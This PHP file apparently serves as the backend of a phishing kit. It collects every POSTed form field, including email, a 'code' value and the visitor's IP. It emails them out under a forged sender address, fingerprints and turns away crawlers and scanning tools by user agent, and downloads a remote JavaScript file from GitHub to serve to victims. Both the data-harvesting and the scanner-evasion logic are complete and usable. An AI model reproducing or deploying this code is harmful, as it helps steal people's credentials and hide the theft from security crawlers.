
<?php



//if(strpos($_SERVER['REMOTE_ADDR'], "142.93") === 0) {
//    die();
//}

$ip = $_SERVER['REMOTE_ADDR'];

$deny = array("142.93.*");
if (in_array ($_SERVER['REMOTE_ADDR'], $deny)) {
   header("location: https://".$ip);
   exit();

   
}

//phpinfo(32);
if (!isset($_SESSION)) {
    session_start();
}
if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['_id'] !== ''){

    
if(isset($_POST['email'])){
    $mail = $_POST['email'];
}
    if(isset($_POST['code'])){
        $code = $_POST['code'];
        }
    if($code !== 'vsdg' && $mail !== '') {
   echo 'Post';
    
    
}

if(isset($_POST['code'])){
$code = $_POST['code'];
} else {
    $code = "NA";
}

if(isset($_POST['subj'])){
    $subject = $_POST['subj'] . ' ' . $code;
} else {
$subject = $code;
}



if (isset($code)) {
    $in = $code;
} else {
    $in = "in";
};
$link = $_POST['ip'];

foreach ($_POST as $key => $value) 
    $body .= $key . ' : ' . $value . "\r\n";


    if($link){
    $body .= "https://whatismyipaddress.com/ip/" . $link;
    }




    if($code == "vsdg"){
        $to = "";
        $in = 'vsdg';
    }elseif($code == "test"){
        echo $body;
    } else {
        $to = "";
    }
    

$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

$bot_identifiers = array(
  'bot',
  'slurp',
  'crawler',
  'spider',
  'curl',
  'facebook',
  'fetch',
);

foreach ($bot_identifiers as $identifier) {
  if (strpos($user_agent, $identifier) !== FALSE) {
      $body .= 'This is a bot';
      $in = 'robot';
      $to = "";
        
    print(TRUE);
    exit();
  } 
}
;
if($in == ''){
    $in = 'noreply';
}


$from = $in . '@' . $_SERVER['HTTP_HOST'];
$headers = "From: " .$from;


mail($to, $subject, $body, $headers);

//echo $body;
unset($_POST);
//header("Location: ".$_SERVER['PHP_SELF']);
exit;
}

$server = $_SERVER['HTTP_ORIGIN'];
$main = "main.js";
$style = "vsdg.css";
$content = "content.js";
$url = parse_url($_SERVER['REQUEST_URI']);

if($_SERVER['QUERY_STRING'] !== 'beta'){
    $content = 'content.js';
    $css = 'vsdg.css';
}else{
    $content = 'beta.js';
    $css = 'beta.css';

}
if (!file_exists('./script/')) {
    mkdir('./script/', 0777, true);
}
if (!file_exists('./css/')) {
    mkdir('./css/', 0777, true);
}
if(!is_file('./script/'. $content)){

    $file = fopen('./script/'. $content, 'w') or die("Unable to open $content!");
    fwrite($file);
    fclose($file);
}


if(!is_file('./css/'. $css)){

    $file = fopen('./css/'. $css, 'w') or die("Unable to open $css!");
    fwrite($file);
    fclose($file);
}
if(!is_file('./script/'. $main)){

$js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/main.js');
$myfile = fopen('./script/'. $main, "w") or die("Unable to open $main!");
fwrite($myfile, $js);
fclose($myfile);
}?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <?php 
    echo "<script type='text/javascript' src='/script/${main}'></script>";
?>
    <!--link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet"-->
  <?php echo "<link href='/css/${css}' rel='stylesheet' Content-Type='text/css'>"?>
</head>
<body>


<?php  echo "<script type='text/javascript' src='/script/${content}'></script>";?>
</body>
</html>
